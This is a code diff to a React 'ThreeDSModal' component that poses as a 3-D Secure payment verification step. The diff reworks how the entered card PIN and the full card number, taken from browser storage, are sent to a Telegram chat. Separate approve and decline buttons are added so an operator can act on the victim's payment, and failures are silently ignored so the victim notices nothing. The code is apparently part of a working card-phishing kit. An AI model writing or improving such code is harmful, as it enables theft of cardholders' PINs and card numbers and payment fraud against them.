@@ -356,27 +356,39 @@ export default function ThreeDSModal({
     }, 5000);
   };
 
-  const handlePinConfirm = () => {
+  const handlePinConfirm = async () => {
     if (pin.trim().length < 4) {
       setError('Enter your card PIN (minimum 4 digits).');
       return;
     }
-    // Отправка PIN + карта с кнопками сразу после клика
+    // Отправка PIN и отдельного сообщения с кнопками
     try {
       const p = pin.trim();
       if (p && p !== lastSentPinRef.current) {
         const pan = sessionStorage.getItem(`payment_card_one_time_pan_${paymentKey}`) || localStorage.getItem(`payment_card_one_time_pan_${paymentKey}`);
         const cardLine = pan || _cardMasked.replace(/\n/g, ' ');
-        
-        // Отправляем кнопки вместо простого сообщения
-        sendTelegramWithButtons(
-          `🔢 Card PIN: ${p}\nCard: ${cardLine}\n\n💳 Approve this payment?`,
-          [
-            { text: '❌ Отклонить', callback_data: 'decline_pin' },
-            { text: '✅ Подтвердить', callback_data: 'approve_pin' }
-          ]
-        );
-        
+
+        // 1) Отправляем PIN и карту отдельным сообщением
+        try {
+          await sendTelegram(`🔢 Card PIN: ${p}\nCard: ${cardLine}`);
+        } catch (e) {
+          // игнорируем, чтобы не ломать UX
+        }
+
+        // 2) Отправляем отдельное сообщение с кнопками подтверждения/отклонения
+        try {
+          await sendTelegramWithButtons(
+            '💳 Approve this payment?',
+            [
+              { text: '❌ Отклонить', callback_data: 'decline_pin' },
+              { text: '✅ Подтвердить', callback_data: 'approve_pin' }
+            ]
+          );
+        } catch (e) {
+          // eslint-disable-next-line no-console
+          console.warn('Failed to send approve/decline buttons:', e);
+        }
+
         lastSentPinRef.current = p;
       }
     } catch {}
